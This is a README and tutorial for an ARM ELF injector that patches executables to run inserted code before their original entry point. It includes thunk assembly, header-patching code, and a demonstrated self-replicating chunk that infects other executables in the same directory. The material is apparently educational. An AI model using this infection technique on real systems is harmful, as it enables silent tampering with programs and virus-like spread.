# ELF Injector
Injects a relocatable code chunk of arbitrary size into an [ELF](https://www.man7.org/linux/man-pages/man5/elf.5.html) executable that will run before the original entry point of the executable.

## Building
**NOTE**: The code can only build and run on a [32-bit ARM](https://developer.arm.com/documentation/100076/0200) processor as it contains a mix of C and assembly.

Build `elf_injector`:

~~~
~/elf_injector $ make all
gcc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -O2 -c src/elf_injector.c -o elf_injector.o
gcc -nostdlib elf_injector.o -o elf_injector
gcc -Werror -std=gnu99 -fno-builtin -Wall -Wextra  -O2 -c src/test.c -o test.o
gcc test.o -o test
~/elf_injector $ 
~~~ 

Build the relocatable code `chunks`:

~~~
~/elf_injector $ cd chunks
~/elf_injector $ make all
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -fpie -O2 -o greeting_strip greeting_strip.c
objdump -d -S greeting_strip > greeting_strip.asm
objcopy -O binary --only-section=.text greeting_strip greeting_strip.bin
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -fpie -O2 -o startup_dump_strip startup_dump_strip.c
objdump -d -S startup_dump_strip > startup_dump_strip.asm
objcopy -O binary --only-section=.text startup_dump_strip startup_dump_strip.bin
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -fpie -O2 -o copy_chunk_strip copy_chunk_strip.c
objdump -d -S copy_chunk_strip > copy_chunk_strip.asm
objcopy -O binary --only-section=.text copy_chunk_strip copy_chunk_strip.bin
~/elf_injector $
~~~

## Running

The `elf_injector`command line utility inserts a code `chunk` into  an ELF executable and has a simple command line interface:

~~~
~/elf_injector $ ./elf_injector
usage: elf_injector <exec> <chunk> <entry offset>
~~~

`exec` is the executable to inject the `chunk` into.  It must be an executable, not a shared library.  `chunk` is a binary file containing the code to inject, and `entry_offset` is the offset in bytes from the beginning of the `chunk` from which to start execution.  The resulting output file is the same name as `exec` albeit with a `.injected` extension.

The chunks directory contains three sample `chunks`  that can be injected into executables: `greeting`, `startup_dump`, and `copy_chunk`  The entry offsets are `0`, `112`, `1640` respectively. 

### greeting
`greeting` outputs `"Hello World\n"` to `stdout`:

~~~
~/elf_injector $ ./test
Testing 123...
~/elf_injector $ ./elf_injector test chunks/greeting_strip.bin 0
inserted 280 byte thunk at pos 1484, start 0x678
inserted 120 byte chunk at pos 1764, start 0x6e4
~/elf_injector $ ./test.injected 
Hello World
Testing 123...
~/elf_injector $
~~~

### startup_dump
`startup_dump` outputs the command line arguments, environment, [auxiliary vector](https://articles.manugarg.com/aboutelfauxiliaryvectors), and `inject_info` to `stdout`:

~~~
~/elf_injector $ ./elf_injector test chunks/startup_dump_strip.bin 112
inserted 280 byte thunk at pos 1484, start 0x678
inserted 1600 byte chunk at pos 1764, start 0x754
~/elf_injector $ ./test.injected
Arguments:
./test.injected
Environment:
INSIDE_EMACS=28.2,comint,tramp:2.5.3.28.2
SSH_CLIENT=192.168.1.2 33816 22
TEXTDOMAIN=Linux-PAM
XDG_SESSION_TYPE=tty
SHLVL=0
MOTD_SHOWN=pam
...
LC_ALL=C.UTF-8
SSH_CONNECTION=192.168.1.2 33816 192.168.1.12 22
TERMCAP=
TMOUT=0
Auxiliary Vector:
16:33238(0x81d6)
6:4096(0x1000)
17:100(0x64)
...
26:0(0x0)
31:3204018156(0xbef96fec)
15:3204017368(0xbef96cd8)
Inject Info:
1:1764(0x6e4)
2:1600(0x640)
3:112(0x70)
Testing 123...
~/elf_injector $
~~~

`inject_info`  is non-standard and is introduced by the `elf_injector` as a way of passing along information to the injected chunk..  It's defined as an array of:

~~~
struct inject_info
{
    unsigned int type;
    unsigned int val;
};
~~~

The supported types are:

~~~
#define II_NULL            0
#define II_CNK_POS         1
#define II_CNK_LEN         2
#define II_CNK_ENT_OFF     3
~~~

The value of `II_CNK_POS` is the position in bytes of the start of the `chunk` in the running executable's file, the value of `II_CNK_LEN` is the length in bytes of the `chunk`, and the value of `II_CNK_ENT_OFF` is the offset in bytes from the beginning of the `chunk` from which to start execution.

The final element in `inject_info` array will have a type of `II_NULL`.

### copy_chunk

`copy_chunk` picks a random executable (that has not yet been injected) in the current working directory, injects itself into the executable, and prints the name of the executable to `stdout`:

~~~
~/elf_injector $ ./elf_injector test ./chunks/copy_chunk_strip.bin 1640
inserted 280 byte thunk at pos 1484, start 0x678
inserted 4604 byte chunk at pos 1764, start 0xd4c
~/elf_injector $ cp test.injected copy_test/test0
~/elf_injector $ cd copy_test
~/elf_injector/copy_test $ ls -la
total 40
drwxr-xr-x 2 kujawk kujawk  4096 Jul 14 18:51 .
drwxr-xr-x 9 kujawk kujawk  4096 Jul 14 18:48 ..
-rwxr-xr-x 1 kujawk kujawk 16264 Jul 14 18:51 test0
-rwxr-xr-x 1 kujawk kujawk  8072 Jul 14 18:47 test1
-rwxr-xr-x 1 kujawk kujawk  8072 Jul 14 18:47 test2
~/elf_injector/copy_test $ ./test0
test2
Testing 123...
~/elf_injector/copy_test $ ./test1
Testing 123...
~/elf_injector/copy_test $ ./test2
test1
Testing 123...
~/elf_injector/copy_test ls -la 
total 56
drwxr-xr-x 2 kujawk kujawk  4096 Jul 14 18:51 .
drwxr-xr-x 9 kujawk kujawk  4096 Jul 14 18:48 ..
-rwxr-xr-x 1 kujawk kujawk 16264 Jul 14 18:51 test0
-rwxr-xr-x 1 kujawk kujawk 16264 Jul 14 18:51 test1
-rwxr-xr-x 1 kujawk kujawk 16264 Jul 14 18:51 test2
~/elf_injector/copy_test $
~~~

In order to locale itself in the currently running executable, it uses the information in `argv`, `auxv` and  `inject_info`.  `argv` is used to find the executable's file, `inject_info` is used to find the `chunk` (itself), and `auxv` is used to find the `thunk` (more on that later).

## Making a relocatable code chunk

A relocatable code `chunk` is code that can run from anywhere in memory.  There can be no absolute addresses in the code and shared libraries can't be linked to, not even `libc`!  While that might seem rather limiting, in practice,  it really isn't.  A lot can be done without `libc`.

For example, [system calls](https://www.man7.org/linux/man-pages/man2/syscall.2.html):

~~~
#define SYSCALL2(n, a, b)             \
    syscall2(n,(long)(a),(long)(b))
    
static long syscall2(long n, long a, long b)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1)
        : "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

SYSCALL2(SYS_open, path, flags);
~~~

Both `elf_injector.c `and `chunks/copy_chunk_strip.c` do not use `libc` or any built-in functions.  In addition, since this is 32-bit ARM, they implement division and modulus with the ABI that the compiler expects.   There's a lot of code already available that can be copied and used when creating new `chunks`.

### Read/Write Static Data

It is possible to embed static data or constant character strings into a `chunk`, `chunks/startup_dump.c` relies heavily on character strings.  How is this done without using absolute addresses to access the data or strings?

Here's a sample chunk:

~~~
#include <syscall.h>
#include <elf.h>
#include <linux/auxvec.h>
#include "../inc/inject_info.h"

#define SYSCALL2(n, a, b)             \
    syscall2(n,(long)(a),(long)(b))

static long syscall2(long n, long a, long b)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1)
        : "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

void _start(int argc, char **argv, char **env, Elf32_auxv_t *aux, struct inject_info *ii)
{
    (void) argc;
    (void) argv;
    (void) env;
    (void) aux;
    (void) ii;

    SYSCALL2(SYS_open, "path", 0);
}
~~~

First, generate the assembly code: 

~~~
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -fno-diagnostics-color -fpie -O2 -S test.c
~~~

It's imperative that the `-fpie` option is used which will generate position independent code for referencing the constant character string:

~~~
	.text
	.section	.rodata
	.align	2
.LC0:
	.ascii	"path\000"
	.text
start:
	...
	ldr		r0, .L4
.LPIC0:
	add		r0, pc, r0
	swi 	#0
	...

.L4:
	.word	.LC0-(.LPIC0+8)
~~~

The goal is to get the address of `"path"` into `r0` so it can be used at the first parameter to the system call invoked by the `swi` instruction.

This is done by first loading the contents of address of `.L4` into `r0`.  `r0`  now contains the offset from the `add` instruction to the address of the string.  The offset is useful only if the location in memory where the code is executing is known.  The `add` instruction loads the execution address  from the program counter, adds it to the offset and stores the result into `r0'. 'r0` now contains the address of `"path"`.

**Note** : `ldr	r0, .L4` is a [pseudo-instruction](https://developer.arm.com/documentation/dui0473/m/arm-and-thumb-instructions/ldr-pseudo-instruction), it's not an absolute load.  Using `objdump`, the actual instruction is `ldr	r0, [pc, #24]` which is a PC-relative load.

No absolute addresses were used to access the character string!

The character string is in the `.rodata` section.  This is a problem because a `chunk` contains only one section, `.text`.   There are two ways to solve this, manually or by forcing the compiler to place the string inside the `.text` section.

Doing it manually is not hard, but requires hand-editing the assembly code to remove the `.rodata` section header: 

~~~
	.text
	.align	2
.LC0:
	.ascii	"constant character string\000"
	.text
start:
	...
~~~

Effectively, the string has been "moved" from the `.rodata` section to the `.text` section.  

Next, the assembly has to be built into an executable.  To do that, it can be wrapped in a C function:

~~~
__attribute((naked))
void _start(void)
{
asm (
	.text
	.align	2
.LC0:
	.ascii	"constant character string\000"
	.text
start:
	...
	);
}
~~~

Finally compile the C function into an executable and extract the `.text` section from it:

~~~
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -fpie -O2 -o test_chunk_strip test_chunk_strip.c
objcopy -O binary --only-section=.text test_chunk_strip test_chunk_strip.bin
~~~

Hot off the assembly (pun not-intended) line, one chunk, `test_chunk_strip.bin`! 

The same trick can be done with the  read/write data in the `.data` section. 

 **NOTE**: Writing to static data works only because the `thunk` runs the `chunk` in a memory mapped region with read, write, and execute bits turned on.  Typically, the `.rodata` section is mapped in as read/execute in conjunction with the `.text` section.

### Stack Strings

If a `chunk` only uses small, constant character strings, hand-editing the assembly is not necessary if stack strings are used:

~~~
#include <syscall.h>
#include <elf.h>
#include <linux/auxvec.h>
#include "../inc/inject_info.h"
#include "fc.h"

#define countof(a)  (sizeof(a) / sizeof(*(a)))

#define SYSCALL2(n, a, b)             \
    syscall2(n,(long)(a),(long)(b))

static long syscall2(long n, long a, long b)
{
    register long ret asm("r0");
    register long r7 asm("r7") = n;
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    __asm volatile (
        "swi #0\n"
        : "=r"(ret)
        : "r"(r7), "r"(r0), "r"(r1)
        : "r2", "r3", "r4", "r9", "r12", "memory"
    );
    return ret;
}

void  _start(int argc, char **argv, char **env, Elf32_auxv_t *aux, struct inject_info *ii)
{
    (void) argc;
    (void) argv;
    (void) env;
    (void) aux;
    (void) ii;

    char path[countof("path")];
    FILL_CHARS(path, 'p', 'a', 't', 'h, '\0');
    SYSCALL2(SYS_open, path, 0);
}
~~~

`FILL_CHARS` is a macro that writes the characters into the character array.  It currently supports up to 12 characters and can easily be extended but it doesn't scale well to larger strings.  It can be found in `chunks/fc.h`.

With stack strings, building a `chunk` is trivial:

~~~
cc -Werror -std=gnu99 -fno-builtin -Wall -Wextra -nostdlib -mgeneral-regs-only -O2 -S test_strip.c
objcopy -O binary --only-section=.text test_strip test_strip.bin
~~~

Note that the `-fpic` option is no longer needed.

### Entry Offset

After the chunk is built, the final step is to determine the entry point offset in bytes from which to start running the `chunk:

~~~
~/elf_injector $ ./tools/get_sym_off.sh
./tools/get_sym_off.sh <executable> <symbol>
~/elf_injector $ ./tools/get_sym_off.sh test_strip start 
0
~~~

## How It Works

Inserting a `chunk` into an executable is not that difficult with some basic knowledge of the ELF format, the various segments and sections of an executable, and how they are laid out and referenced in the file.

At minimum, an ELF executable contains a text segment which is mapped as read/execute and contains the code of the executable (the `.text` section).  The text segment starts on a page boundary when loaded into memory but, more often than not, the segment does not end of a page boundary.

In a typical executable, the next segment is the data segment which is mapped as read/write and contains static data (the `.data` section).  The data segment starts at a subsequent page page boundary.

The unused space, or padding,  between the end of the text segment and next page boundary is the perfect spot to insert a `chunk`.  Inserting the `chunk` here will not invalidate data segment access from the code in the text segment because the compiler and linker take into account the unused padding when generating the absolute addresses or offsets to read and write static data.
.
For this reason, the size of the `chunk` cannot exceed that of the padding, which is, at most, a page. 
 
This doesn't leave a lot of room for a `chunk`.  A `chunk` that's too large for the padding can still be inserted if what's inserted into the padding is a small `thunk` instead.

### Thunk

A `thunk` is a function that acts as a place holder, which when executed replaces itself with another function.  Thunks are used in dynamic liking in conjunction with the [Procedure Linkage Table and the Global Offset Table](https://docs.thecodeguardian.dev/operating-systems/linux-operating-system/understanding-plt-and-got). 

In the `elf_injector`, the `thunk` locates the position of the `chunk` in the executable, memory maps it in, and executes it.  When the `chunk` returns, the `thunk` calls the original entry point:

~~~
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <elf.h>
#include <linux/auxvec.h>
#include "../inc/inject_info.h"
...


size chunk_off       = 0x00000001;
size chunk_len       = 0x00000002;
size chunk_entry_off = 0x00000003;
struct inject_info ii[] =
{
    {II_CNK_POS,     5},
    {II_CNK_LEN,     6},
    {II_CNK_ENT_OFF, 7},
    {II_NULL,        8}
};

void start(int argc, char **argv, char **env, Elf32_auxv_t *aux)
{
    int fd = (int) SYSCALL2(SYS_open, argv[0], O_RDONLY);
    if (fd == -1)
    {
        goto cleanup;
    }

    u8 *chunk_base = (u8 *) SYSCALL6(SYS_mmap2, NULL, chunk_len, 
                                     PROT_READ | PROT_WRITE | PROT_EXEC,
                                     MAP_PRIVATE, fd, chunk_off);
    if (chunk_base == MAP_FAILED)
    {
        goto cleanup;
    }

    void (*chunk_entry)(int, char **, char **, Elf32_auxv_t *, struct inject_info *)
        = (void (*)(int, char **, char **, Elf32_auxv_t *, struct inject_info *))
        (chunk_base + chunk_entry_off);
    chunk_entry(argc, argv, env, aux, ii);
    SYSCALL2(SYS_munmap, chunk_entry, chunk_len);
cleanup:
    SYSCALL1(SYS_close, fd);
}

__attribute__((naked, noreturn))
void _thunk_start(void)
{
    __asm volatile (
        "push    {r0-r11, lr}\n"
        "ldr     r0, [sp, #52]\n"
        "add     r1, sp, #56\n"
        "add     r2, r1, r0, lsl #2\n"
        "mov     r3, r2\n"
        "add     r2, r2, #4\n"
        "nz:\n"
        "add     r3, r3, #4\n"
        "ldr     r4, [r3]\n"
        "cmp     r4, #0\n"
        "bne     nz\n"
        "add     r3, r3, #4\n"
        "bl      start\n"
        "pop     {r0-r11, lr}\n"
        "ldr     ip, host_entry\n"
        "bx      ip\n"
        ".align  2\n"
        "host_entry:\n"
        ".word   4\n"
        );
}
~~~

When the `elf_injector`injects the `thunk` into the executable, it has to patch the `thunk` with the following information:

- The position of the `chunk` in the executable file rounded down to a page boundary
- The length in bytes of the `chunk` plus rounding
- The offset in bytes from the beginning of the page to start execution of the `chunk`

In addition, the static `inject_info` in the `thunk` must be patched with:

- The position of the `chunk` in the executable file
- The length in bytes of the `chunk`
- The offset in bytes from the beginning of the `chunk` to start execution of the `chunk`

The offsets of the locations in the `thunk` to patch are known at compile time and are built into the `elf_injector`.  The `elf_injector` writes the appropriate value into each location in the `thunk` before it's inserted into the executable.

#### Assembly

The `thunk` consists of a hand-crafted chunk of assembly that sets up the arguments to `start` and calls it:

~~~
push    {r0-r11, lr}
~~~

The registers must have their original values at the time the `thunk` calls the original entry point, save them on the stack.

Upon initial entry, the loader pushes `argc`, `argv`, `env`, and `auxv` onto the stack.

~~~
ldr     r0, [sp, #52]
add     r1, sp, #56
~~~

Taking into account the size of the registers pushed onto the stack at the start of the `thunk`, load the value of `argc` nto `r0`, and the address of the first entry of `argv` into `r1`.

~~~
add     r2, r1, r0, lsl #2
mov     r3, r2
add     r2, r2, #4
~~~

Skip over the entries in `argv` and load the address of the first entry of `env` into `r2`. 

~~~
nz:
add     r3, r3, #4
ldr     r4, [r3]
cmp     r4, #0
bne     nz
add     r3, r3, #4
~~~

The final entry in `env` is a NULL pointer, one beyond is the first element in `aux`'.  Find the start of `auxv` and load it into `r3`.

~~~
bl      start
~~~

Now, that the arguments to `start` are in the correct registers as per the [Procedure Call Standard](https://github.com/ARM-software/abi-aa/blob/c51addc3dc03e73a016a1e4edf25440bcac76431/aapcs32/aapcs32.rst), call it.

~~~
pop     {r0-r11, lr}
ldr     ip, host_entry
bx      ip
.align  2
host_entry:
.word   4
~~~

When `start` returns, restore the registers to their original values and call the original entry point  The original entry point is stored right after `bx      ip` and it is one of the values patched in by the `elf_injector`. 

#### C

`start` is a straight-forward C function which opens the executable file, memory maps the portion of the file that contains the `chunk`, and executes the `chunk`, making sure to clean-up after itself when the `chunk` is finished.


### Chunk

If the `thunk` is inserted into the padding at the end of the text segment and the padding is at most the size of a page, how can a `chunk` of arbitrary size be inserted after the `thunk` is inserted?

It turns out that an arbitrary-sized `chunk` can be inserted as long as:

- The file offsets and virtual addresses of each segment remain modular congruent to the page size
- The file size and memory size of the text segment are increased by the size of the `thunk`, not the total size of the bytes inserted which includes the `chunk`

Preserving modular congruency requires that the total number of bytes inserted are a multiple of the page size, padding is used by the `elf_injector` to ensure that this is the case. 

For convenience, the `elf_injector` inserts the `chunk` directly after the `thunk`.  The `chunk` could very well be inserted at the end of the file.

### Injection

Injection requires knowledge of the layout and structure of an [ELF](https://man7.org/linux/man-pages/man5/elf.5.html) executable.  The ELF specification is freely available online.  Reading the document before this section is advised and contains more than enough information to follow along.

Injecting the `thunk` and the `chunk` into an executable involves a number of steps:

~~~
Elf32_Ehdr *ehdr = (Elf32_Ehdr *) bin->exec.base;
Elf32_Phdr *phdrs = (Elf32_Phdr *) (bin->exec.base + ehdr->e_phoff);
Elf32_Shdr *shdrs = (Elf32_Shdr *) (bin->exec.base + ehdr->e_shoff);
Elf32_Phdr *text_phdr;
if (!(text_phdr = get_text_phdr(ehdr, phdrs)))
{
    return false;
}
~~~

First, locate the ELF header, the segment header table, the section header table, and the text segment header in the target executable. 

~~~
size ins_off = (size) (text_phdr->p_offset + text_phdr->p_filesz);
if (ins_off < 0)
{
    return false;
}
~~~

Locate the insertion point in the file.  The insertion point is at the end of the text segment which is the file offset of the start of the text segment plus the size of the text segment in the file.

~~~
bin->pad1 = -ins_off & 3;
size thunk_len = bin->pad1 + bin->thunk.len;
thunk_ent_off += bin->pad1;
~~~

Align the insertion point to a 4 byte boundary since the `thunk` is made up entirely of 32-bit ARM instructions.  Make sure to adjust the entry point of the `thunk` by any padding added.

~~~
if (thunk_len > (-ins_off & (PGSIZE - 1)))
{
    return false;
}
~~~

Ensure that the `thunk` is small enough to fit in the padding at the end of the text segment. 

~~~
bin->pad2 = -(thunk_len + bin->chunk.len) & (PGSIZE - 1);
size chunk_len = bin->pad2 + bin->chunk.len;
size total_len = thunk_len + chunk_len;
~~~

Ensure the total number of bytes inserted is a multiple of the page size. 

~~~
for (i32 i = 0; i < ehdr->e_phnum; i++)
{
    if (phdrs[i].p_offset > (usize) ins_off)
    {
        phdrs[i].p_offset += (usize) total_len;
    }
}

for (i32 i = 1; i < ehdr->e_shnum; i++)
{
    if (shdrs[i].sh_offset > (usize) ins_off)
    {
        shdrs[i].sh_offset += (usize) total_len;
    }
}
~~~

Update all segment and section file offsets that occur after the
insertion position by the total number of bytes inserted.

~~~
for (i32 i = 1; i < ehdr->e_shnum; i++)
{
    if (shdrs[i].sh_offset + shdrs[i].sh_size == (usize) ins_off)
    {
        if (shdrs[i].sh_type != SHT_PROGBITS)
        {
            return false;
        }
        shdrs[i].sh_size += (usize) thunk_len;
        break;
    }
}
~~~

The text segment contains multiple sections and since the `thunk` is inserted at the end of the text segment, the size of the last section in the text segment must be increased by the length of the `thunk`.

~~~
size chunk_off = ins_off + thunk_len;
size tchunk_off = chunk_off & ~(PGSIZE - 1);
size tchunk_len = chunk_off - tchunk_off + chunk_len;
size tchunk_ent_off = chunk_off - tchunk_off + chunk_ent_off;
tchunk_off /= PGSIZE;
memcpy(bin->thunk.base + OFF_CNK_OFF, &tchunk_off, sizeof(tchunk_off));
memcpy(bin->thunk.base + OFF_CNK_LEN, &tchunk_len, sizeof(tchunk_len));
memcpy(bin->thunk.base + OFF_CNK_ENT_OFF, &tchunk_ent_off, 
                       sizeof(tchunk_ent_off));
~~~

 Patch the `thunk` so that it will be able to find and execute the `chunk` in the file. 
 
~~~
memcpy(bin->thunk.base + OFF_HOST_ENT, &ehdr->e_entry, 
       sizeof(ehdr->e_entry));
~~~

Patch the `thunk` so that it calls the original entry point when it finishes. 

~~~
size ii_tchunk_pos = ins_off + bin->pad1 + bin->thunk.len;
memcpy(bin->thunk.base + OFF_II_CNK_POS, &ii_tchunk_pos, sizeof(ii_tchunk_pos));
memcpy(bin->thunk.base + OFF_II_CNK_LEN, &bin->chunk.len, sizeof(bin->chunk.len));
memcpy(bin->thunk.base + OFF_II_CNK_ENT_OFF, &chunk_ent_off, sizeof(chunk_ent_off));
~~~

Path the `inject_info` in the `thunk` so it can be passed to the `chunk`.

~~~
ehdr->e_entry = text_phdr->p_vaddr + text_phdr->p_filesz
    + (usize) thunk_ent_off;
~~~

Adjust the target executable's entry point so that it will call the `thunk` when it's started. 

~~~
text_phdr->p_filesz += (usize) thunk_len;
text_phdr->p_memsz += (usize) thunk_len;
~~~

Increase the size of the text segment in the file and memory by thunk size. 

~~~
if (ehdr->e_shoff > (usize) ins_off)
{
    ehdr->e_shoff += (usize) total_len;
}
~~~

If the offset of the section header table is after the insertion point, it must be adjusted by the total length of the bytes inserted.

~~~
ehdr->e_ident[EI_NIDENT - 1] = I_MARKER;
~~~ 

Use an unused byte in the ELF header to mark the file as injected to prevent it from being injected a second time. 






## Acknowledgments

Silvio Cesare for the original idea  of [ELF injection](https://github.com/elfmaster/unix_virus_anniversary/blob/master/unix-viruses.txt). 

[Chris Wellons](https://nullprogram.com) for a number of different techniques for "libc free" programming  used in the code from arena allocation to systam calls.



